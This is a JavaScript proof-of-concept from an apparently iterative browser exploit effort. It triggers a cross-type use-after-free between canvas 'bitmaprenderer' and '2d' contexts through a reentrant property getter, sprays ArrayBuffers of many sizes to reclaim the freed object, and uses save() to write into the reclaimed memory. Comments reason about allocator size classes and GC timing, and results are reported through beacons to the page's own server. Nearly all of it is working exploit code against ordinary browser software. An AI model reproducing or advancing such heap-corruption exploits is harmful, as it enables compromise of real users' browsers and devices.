// p488c — cross-type UAF: heterogeneous AB reclaim + allocation-free result channel
//
// V488b result (18:54:45): BOOT, BITMAP-CHECK, AB-SPRAY
//   count=500,dCtx=true,lCtx=true,cc=1   ← reentrant getter fired, inner 2d context
//   created, outer bitmaprenderer replaced it (C1 freed). Then SILENCE, hold
//   socket still OPEN → main thread wedged after the spray, before SAVE-CALL.
//
// Two hypotheses for the wedge:
//   H1: 500 x 768B ABs did NOT reclaim the freed slot; save() wrote +1 at +592
//       into memory owned by something else → allocator/XHR wedge on the next
//       allocation. (If the slot had been reclaimed, +592 is just AB data.)
//   H2: an AB DID reclaim the slot, but a GC after the spray marked dCtx and
//       visitAdditionalChildren read m_canvas at +32 = 0 → renderer lost.
//       (Hold stayed open, so this is less likely, but the oracle is ambiguous.)
//
// This probe separates the hypotheses and removes every avoidable allocation
// between the free and the save:
//   1. Pre-create ALL result strings + one reusable XMLHttpRequest BEFORE the
//      UAF. After the spray, reporting uses only pre-existing strings, so no
//      JSC allocation can trigger a GC at the wrong moment.
//   2. Heterogeneous spray (70 ABs, 34 size classes, dense 16-byte steps across
//      640..1024) so the exact 768-class (or header-shifted class) is covered.
//      768 is sprayed FIRST so a correct size class reclaims on allocation #1.
//   3. No XHR at all between the free and save().
//   4. save() → one pre-created-XHR ALIVE beacon → allocation-free full scan of
//      every AB for the value 1 → HIT/SIZE/OFF beacons.
//
// If ALIVE arrives: the save returned and the heap survived a post-save alloc.
//   HIT      → AB reclaimed the slot; offset tells the counter offset.
//   NONE     → save wrote into non-AB memory (size class wrong).
// If ALIVE never arrives but the hold stays open: save() itself wedges on the
//   unclaimed block (H1 after all, with the write hitting a live object).
// If the hold CLOSEs: renderer death, timestamp from the host.
//
// Beacon prefix: V488C-

(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();

  // Normal beacon helper — ONLY used before the UAF free.
  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V488C-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  window.__dCtx = null;
  window.__lCtx = null;
  window.onerror = function(m, u, l) {
    try { B('ERR', String(m).substring(0, 90) + '@' + l); } catch(e) {}
  };

  // Liveness oracle (async, established before the free).
  try {
    var __hold = new XMLHttpRequest();
    __hold.open('GET', location.origin + '/hold?tag=V488C-' + Date.now(), true);
    __hold.onreadystatechange = function() {};
    __hold.send();
  } catch(e) {}

  // ── bitmaprenderer availability ──
  var testC = document.createElement('canvas');
  testC.width = 1; testC.height = 1;
  var testBM = null;
  try { testBM = testC.getContext('bitmaprenderer'); } catch(e) {}
  var hasBitmap = !!testBM;
  B('BITMAP-CHECK', 'available=' + hasBitmap + ',type=' + typeof testBM);
  testC = null; testBM = null;
  if (!hasBitmap) { B('ABORT', 'no-bitmaprenderer'); return; }

  // ═══════════════════════════════════════════════════════════
  // Pre-create the whole result channel BEFORE the UAF.
  // Nothing after the spray may allocate a JS string/object.
  // ═══════════════════════════════════════════════════════════
  var SIZES = [
    768, 768, 768,
    640, 656, 672, 688, 704, 720, 736, 752, 784, 800, 816, 832, 848, 864, 880,
    896, 912, 928, 944, 960, 976, 992, 1008, 1024,
    512, 576, 1088, 1152, 1280, 1536, 1792, 2048, 2560, 3072, 4096
  ];
  var NUM = SIZES.length;
  var lens = new Array(NUM);
  var abBody = new Array(NUM);
  var szBody = new Array(NUM);
  for (var i = 0; i < NUM; i++) {
    lens[i] = SIZES[i];
    abBody[i] = 'ab=' + i;
    szBody[i] = 'sz=' + SIZES[i];
  }
  var offBody = new Array(1025);
  for (var k = 0; k <= 1024; k++) offBody[k] = 'off=' + (k * 4);
  var cntBody = new Array(32);
  for (var c = 0; c < 32; c++) cntBody[c] = 'n=' + c;

  var RQ = new XMLHttpRequest();
  var U_ALIVE = BASE + '/beacon/V488C-ALIVE';
  var U_HIT   = BASE + '/beacon/V488C-HIT';
  var U_SIZE  = BASE + '/beacon/V488C-SIZE';
  var U_OFF   = BASE + '/beacon/V488C-OFF';
  var U_CNT   = BASE + '/beacon/V488C-CNT';
  var U_NONE  = BASE + '/beacon/V488C-NONE';
  var U_END   = BASE + '/beacon/V488C-END';
  var S_OK    = 'ok';
  var S_ERR   = 'err';
  var S_NONE  = 'none';
  var S_END   = 'end';

  // Allocation-free reporter: url/body are pre-created strings.
  function R(url, body) {
    try { RQ.open('POST', url, false); RQ.send(body); } catch(e) {}
  }

  B('PRECOMP', 'abs=' + NUM + ',strings=' + (NUM * 2 + 1025 + 32));

  // ═══════════════════════════════════════════════════════════
  // Cross-type UAF: bitmaprenderer outer + 2d inner
  // ═══════════════════════════════════════════════════════════
  var dCtx = null, lCtx = null;
  var tc = document.createElement('canvas');
  tc.width = 10; tc.height = 10;
  document.body.appendChild(tc);

  var cc = 0, s = {};
  Object.defineProperty(s, 'alpha', {
    get: function() {
      cc++;
      if (cc === 1) dCtx = tc.getContext('2d');
      return true;
    }
  });

  try {
    lCtx = tc.getContext('bitmaprenderer', s);
  } catch(e) {
    B('OUTER-ERR', String(e && e.message || e));
  }
  window.__dCtx = dCtx;
  window.__lCtx = lCtx;

  if (!dCtx) { B('CROSSTYPE-FAIL', 'dCtx=null,cc=' + cc); return; }

  // ═══════════════════════════════════════════════════════════
  // Spray immediately — no XHR between the free and save().
  // ═══════════════════════════════════════════════════════════
  var abs = new Array(NUM);
  var views = new Array(NUM);
  for (var a = 0; a < NUM; a++) {
    var ab = new ArrayBuffer(lens[a]);
    abs[a] = ab;
    views[a] = new DataView(ab);
  }

  // ═══════════════════════════════════════════════════════════
  // save(): +1 at m_unrealizedSaveCount (fixed offset, no deref)
  // ═══════════════════════════════════════════════════════════
  var saveOk = false;
  try { dCtx.save(); saveOk = true; } catch(e) {}
  R(U_ALIVE, saveOk ? S_OK : S_ERR);

  // ═══════════════════════════════════════════════════════════
  // Allocation-free scan: find the 1 written by save().
  // Numbers only; DataView reads allocate nothing.
  // ═══════════════════════════════════════════════════════════
  var hitAb = -1, hitOff = -1, hits = 0;
  for (var b = 0; b < NUM; b++) {
    var v = views[b], L = lens[b];
    for (var o = 0; o + 4 <= L; o += 4) {
      if (v.getUint32(o, true) === 1) {
        if (hits === 0) { hitAb = b; hitOff = o; }
        hits++;
        if (hits >= 31) break;
      }
    }
    if (hits >= 31) break;
  }

  // ═══════════════════════════════════════════════════════════
  // Report via the pre-created channel.
  // ═══════════════════════════════════════════════════════════
  if (hitAb >= 0) {
    R(U_HIT, abBody[hitAb]);
    R(U_SIZE, szBody[hitAb]);
    R(U_OFF, offBody[hitOff >> 2]);
    if (hits > 1) R(U_CNT, cntBody[hits > 31 ? 31 : hits]);
  } else {
    R(U_NONE, S_NONE);
  }
  R(U_END, S_END);
})();
